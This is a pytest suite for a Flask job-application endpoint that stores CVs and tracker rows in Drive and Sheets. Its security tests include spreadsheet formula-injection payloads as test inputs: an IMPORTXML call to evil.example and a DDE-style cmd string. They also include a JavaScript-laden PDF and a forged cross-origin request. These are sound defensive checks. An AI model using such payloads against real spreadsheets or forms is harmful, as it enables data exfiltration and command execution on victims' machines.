"""End-to-end through the Flask endpoint, against the in-memory workspace.
Covers the brief's §16 scenarios: full-time, part-time, below-minimum days,
expression of interest, missing fields, bad email, bad/oversized files,
duplicate submission, Drive/Sheets/email failures, inactive vacancy, and
unauthorised access."""
import io

import pytest

from careers import app as app_module
from careers import config
from careers.conftest import form_data, make_pdf

ORIGIN = "https://www.gojiphysio.com"
HEADERS = {"Origin": ORIGIN, "X-Goji-Careers": "1"}


@pytest.fixture
def client():
    app_module.app.testing = True
    return app_module.app.test_client()


def post(client, data=None, cv=None, headers=None, **over):
    d = form_data(**over) if data is None else data
    if cv is not False:
        name, body, mime = cv or ("Jane CV.pdf", make_pdf(), "application/pdf")
        d["cv"] = (io.BytesIO(body), name, mime)
    return client.post("/api/applications", data=d, content_type="multipart/form-data",
                       headers=HEADERS if headers is None else headers)


# ---- happy paths --------------------------------------------------------------------

def test_full_time_application_produces_exactly_one_of_everything(client, fake_ws, sent):
    r = post(client)
    assert r.status_code == 200, r.json
    ref = r.json["reference"]
    assert ref.startswith("GOJI-APP-20") and ref.endswith("-0001")

    folders = fake_ws.app_folders()
    assert len(folders) == 1 and folders[0]["name"] == ref          # reference, not the name
    files = fake_ws.files_in(folders[0]["id"])
    kinds = sorted(f["appProperties"]["goji_kind"] for f in files)
    assert kinds == ["cv", "summary"]
    cv = next(f for f in files if f["appProperties"]["goji_kind"] == "cv")
    assert cv["name"] == f"{ref}-CV.pdf"                            # sanitised, no candidate name
    assert len(fake_ws.rows) == 1
    row = dict(zip(config.TRACKER_COLUMNS, fake_ws.rows[0]))
    assert row["Recruitment status"] == "New"
    assert row["Role applied for"] == "Physiotherapist"
    assert row["Open to alternative seniority level"] == "No"
    assert row["Actual years of clinical experience"] == 4

    assert [m["To"] for m in sent] == ["hello@gojiphysio.com", "applicant@example.com"]
    internal, ack = sent
    assert internal["Subject"] == "[Goji Careers] New application — Physiotherapist"
    assert not internal.is_multipart() or not list(internal.iter_attachments())  # no CV attached
    assert ack["Subject"] == "Thank you for your interest in Goji!"
    assert "Physiotherapist position" in ack.get_content()

    # The parent folders follow Applications/<year>/<role>.
    parent = fake_ws.files[folders[0]["parents"][0]]
    assert parent["name"] == "Physiotherapist"


def test_part_time_and_also_consider(client, fake_ws, sent):
    r = post(client, employment="part-time", days_per_week="3", also_consider="yes",
             preferred_days="Saturday")
    assert r.status_code == 200
    row = dict(zip(config.TRACKER_COLUMNS, fake_ws.rows[0]))
    assert row["Employment preference"] == "Part-time"
    assert row["Days available per week"] == "3"
    assert row["Open to alternative seniority level"] == "Yes"
    assert row["Preferred working days"] == "Saturday"


def test_part_time_below_minimum_is_stored_for_review_not_rejected(client, fake_ws, sent):
    r = post(client, employment="part-time", days_per_week="2")
    assert r.status_code == 200
    assert dict(zip(config.TRACKER_COLUMNS, fake_ws.rows[0]))["Days available per week"] == "2"


def test_expression_of_interest_is_distinct(client, fake_ws, sent):
    r = post(client, role="general", interest_area="Clinic operations",
             ahpc_status=None, clinical_experience=None)
    assert r.status_code == 200, r.json
    row = dict(zip(config.TRACKER_COLUMNS, fake_ws.rows[0]))
    assert row["Application type"] == "Expression of interest"
    assert row["Role applied for"] == "General expression of interest"
    assert row["Interest area (general)"] == "Clinic operations"
    parent = fake_ws.files[fake_ws.app_folders()[0]["parents"][0]]
    assert parent["name"] == "General Expressions of Interest"
    assert sent[0]["Subject"] == "[Goji Careers] New expression of interest"
    assert "position" not in sent[1].get_content()          # doesn't imply a vacancy


def test_references_increment(client, fake_ws, sent):
    a = post(client).json["reference"]
    b = post(client, idempotency_key="test-key-0000000000000002",
             email="other@example.com").json["reference"]
    assert a.endswith("-0001") and b.endswith("-0002")


# ---- validation failures --------------------------------------------------------------

def test_missing_fields_and_invalid_email(client, fake_ws):
    r = post(client, full_name=None, email="nope")
    assert r.status_code == 400
    assert set(r.json["fields"]) >= {"full_name", "email"}
    assert fake_ws.app_folders() == [] and fake_ws.rows == []


def test_unsupported_and_suspicious_files(client, fake_ws):
    r = post(client, cv=("cv.exe", b"MZ\x90\x00", "application/octet-stream"))
    assert r.status_code == 400 and "cv" in r.json["fields"]
    r = post(client, cv=("cv.pdf", make_pdf(b"<< /S /JavaScript /JS (x) >>"), "application/pdf"))
    assert r.status_code == 400 and "cv" in r.json["fields"]
    r = post(client, cv=False)
    assert r.status_code == 400 and "cv" in r.json["fields"]
    assert fake_ws.app_folders() == []


def test_oversized_cv(client, fake_ws):
    big = make_pdf(b"%" + b"x" * (11 * 1024 * 1024))
    r = post(client, cv=("cv.pdf", big, "application/pdf"))
    assert r.status_code == 413
    assert fake_ws.app_folders() == []


def test_mobile_upload_with_generic_mime_type(client, fake_ws, sent):
    r = post(client, cv=("IMG_upload.pdf", make_pdf(), "application/octet-stream"))
    assert r.status_code == 200


# ---- duplicates and partial failures ----------------------------------------------------

def test_duplicate_submission_returns_same_reference_and_sends_once(client, fake_ws, sent):
    first = post(client).json["reference"]
    second = post(client).json["reference"]
    assert first == second
    assert len(fake_ws.app_folders()) == 1 and len(fake_ws.rows) == 1
    assert len(sent) == 2   # one internal + one acknowledgement, not four


def test_drive_upload_failure_then_retry(client, fake_ws, sent):
    fake_ws.fail = {"upload"}
    r = post(client)
    assert r.status_code == 503 and r.json["code"] == "storage_failed"
    assert fake_ws.rows == [] and sent == []         # no success, no emails
    fake_ws.fail = set()
    r = post(client)
    assert r.status_code == 200
    assert len(fake_ws.app_folders()) == 1            # the same folder, finished off
    assert len(fake_ws.files_in(fake_ws.app_folders()[0]["id"])) == 2
    assert len(fake_ws.rows) == 1


def test_sheets_failure_then_retry_reuses_folder(client, fake_ws, sent):
    fake_ws.fail = {"append"}
    r = post(client)
    assert r.status_code == 503
    folder = fake_ws.app_folders()[0]
    assert len(fake_ws.files_in(folder["id"])) == 2   # CV + summary already stored
    fake_ws.fail = set()
    r = post(client)
    assert r.status_code == 200 and r.json["reference"] == folder["name"]
    assert len(fake_ws.app_folders()) == 1
    assert len(fake_ws.files_in(folder["id"])) == 2   # nothing uploaded twice
    assert len(fake_ws.rows) == 1


def test_half_finished_application_number_is_never_reused(client, fake_ws, sent):
    fake_ws.fail = {"append"}
    stuck = post(client)
    assert stuck.status_code == 503
    fake_ws.fail = set()
    other = post(client, idempotency_key="test-key-0000000000000009", email="b@example.com")
    assert other.json["reference"].endswith("-0002")


def test_email_failure_still_succeeds_and_is_not_resubmitted(client, fake_ws, monkeypatch):
    from careers import mailer

    def boom(_msg):
        raise OSError("smtp down")
    monkeypatch.setattr(config, "SMTP_PASS", "x")
    monkeypatch.setattr(mailer, "_send", boom)
    r = post(client)
    assert r.status_code == 200 and r.json["ok"]
    assert len(fake_ws.rows) == 1
    props = fake_ws.app_folders()[0]["appProperties"]
    assert "goji_notified" not in props and "goji_acked" not in props
    # A retry (same key) neither re-stores nor creates anything new.
    sent = []
    monkeypatch.setattr(mailer, "_send", lambda m: sent.append(m))
    assert post(client).status_code == 200
    assert len(fake_ws.rows) == 1 and len(fake_ws.app_folders()) == 1
    assert len(sent) == 2   # the emails that failed the first time go out now, once


# ---- roles ---------------------------------------------------------------------------

def test_inactive_vacancy_is_refused(client, fake_ws):
    r = post(client, role="clinical-lead")
    assert r.status_code == 409 and r.json["code"] == "role_closed"
    assert fake_ws.app_folders() == []


def test_unknown_role_is_refused(client, fake_ws):
    r = post(client, role="ceo")
    assert r.status_code == 400 and r.json["code"] == "unknown_role"


def test_vacancy_list_unavailable_refuses_jobs_but_not_interest(client, fake_ws, sent, monkeypatch):
    from careers import vacancies

    def down():
        raise OSError("site down")
    monkeypatch.setattr(vacancies, "_fetch", down)
    vacancies.reset_cache()
    assert post(client).status_code == 503
    r = post(client, role="general", interest_area="Physiotherapy",
             idempotency_key="test-key-000000000000000g")
    assert r.status_code == 200


# ---- security --------------------------------------------------------------------------

def test_no_endpoint_reads_or_lists_applications(client, fake_ws, sent):
    post(client)
    for path in ("/api/applications", "/api/applications/GOJI-APP-2026-0001",
                 "/applications", "/api/tracker", "/api/cv"):
        assert client.get(path).status_code in (404, 405)
    assert client.put("/api/applications").status_code == 405
    assert client.delete("/api/applications").status_code == 405


def test_csrf_requires_our_origin_and_header(client, fake_ws):
    assert post(client, headers={"Origin": "https://evil.example", "X-Goji-Careers": "1"}).status_code == 403
    assert post(client, headers={"Origin": ORIGIN}).status_code == 403
    assert post(client, headers={}).status_code == 403
    pre = client.options("/api/applications", headers={"Origin": "https://evil.example"})
    assert pre.status_code == 403 and "Access-Control-Allow-Origin" not in pre.headers
    pre = client.options("/api/applications", headers={"Origin": ORIGIN})
    assert pre.headers["Access-Control-Allow-Origin"] == ORIGIN
    assert fake_ws.app_folders() == []


def test_bot_checks(client, fake_ws):
    assert post(client, company_url="http://spam").json["code"] == "bot_check"
    assert post(client, elapsed_ms="900").json["code"] == "bot_check"
    assert fake_ws.app_folders() == []


def test_rate_limit_per_ip_ignores_retries(client, fake_ws, sent, monkeypatch):
    monkeypatch.setattr(config, "PER_IP_PER_HOUR", 2)
    monkeypatch.setattr(config, "PER_EMAIL_PER_DAY", 10)
    for i in range(2):
        assert post(client, idempotency_key=f"test-key-00000000000000a{i}").status_code == 200
    assert post(client, idempotency_key="test-key-00000000000000a0").status_code == 200  # retry
    assert post(client, idempotency_key="test-key-00000000000000a9").status_code == 429


def test_formula_injection_stored_as_literal_text(client, fake_ws, sent):
    evil = '=IMPORTXML("http://evil.example","//a")'
    post(client, full_name=evil, intro="+cmd|' /C calc'!A0")
    row = dict(zip(config.TRACKER_COLUMNS, fake_ws.rows[0]))
    assert row["Full name"] == evil          # the value is unchanged...
    # ...and the Sheets client always appends with valueInputOption=RAW (never
    # USER_ENTERED), so Sheets stores it as text instead of evaluating it.
    import inspect
    from careers import workspace
    src = inspect.getsource(workspace.Workspace.append_row)
    assert '"valueInputOption": "RAW"' in src and "USER_ENTERED" not in src.split("#")[0]


def test_logs_carry_no_personal_data(client, fake_ws, sent, caplog):
    caplog.set_level("INFO")
    post(client)
    post(client, email="bad")
    text = caplog.text
    for pii in ("Test Applicant", "applicant@example.com", "9123 4567", "Synthetic applicant"):
        assert pii not in text
